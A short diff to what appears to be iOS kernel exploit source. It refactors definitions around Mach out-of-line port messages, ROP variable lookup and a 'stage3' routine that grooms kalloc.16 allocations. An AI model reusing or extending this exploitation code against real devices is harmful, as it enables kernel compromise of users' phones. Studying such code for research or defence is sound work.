@@ -5,14 +5,14 @@
 #include <aio.h>
 #include <fcntl.h>
 
+#include <shared/iokit.h>
+
 typedef struct {
 	mach_msg_header_t head;
 	mach_msg_body_t msgh_body;
 	mach_msg_ool_ports_descriptor_t desc[1];
 	char pad[4096]; // FIXME: what a waste
 } ool_message_struct;
-
-typedef uint64_t kptr_t;
 
 typedef volatile struct {
     uint32_t ip_bits;
@@ -67,25 +67,6 @@ typedef volatile struct {
 #define IKOT_IOKIT_CONNECT 29
 #define IKOT_CLOCK 25
 #define NENT 1
-enum
-{
-    kOSSerializeDictionary      = 0x01000000U,
-    kOSSerializeArray           = 0x02000000U,
-    kOSSerializeSet             = 0x03000000U,
-    kOSSerializeNumber          = 0x04000000U,
-    kOSSerializeSymbol          = 0x08000000U,
-    kOSSerializeString          = 0x09000000U,
-    kOSSerializeData            = 0x0a000000U,
-    kOSSerializeBoolean         = 0x0b000000U,
-    kOSSerializeObject          = 0x0c000000U,
-
-    kOSSerializeTypeMask        = 0x7F000000U,
-    kOSSerializeDataMask        = 0x00FFFFFFU,
-
-    kOSSerializeEndCollection   = 0x80000000U,
-
-    kOSSerializeMagic           = 0x000000d3U,
-};
 
 uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char * name) {
 	while (ropvars != NULL) {
@@ -640,7 +621,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	ool_message_struct * ool_message = malloc(sizeof(ool_message_struct));
 	ool_message->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
     ool_message->head.msgh_local_port = MACH_PORT_NULL;
-    ool_message->head.msgh_size = sizeof(ool_message)-2048;
+    ool_message->head.msgh_size = (unsigned int)sizeof(ool_message) - 2048;
     ool_message->msgh_body.msgh_descriptor_count = 1;
     ool_message->desc[0].count = 1; // will still go to kalloc.16 but we don't have another point of failture
     ool_message->desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
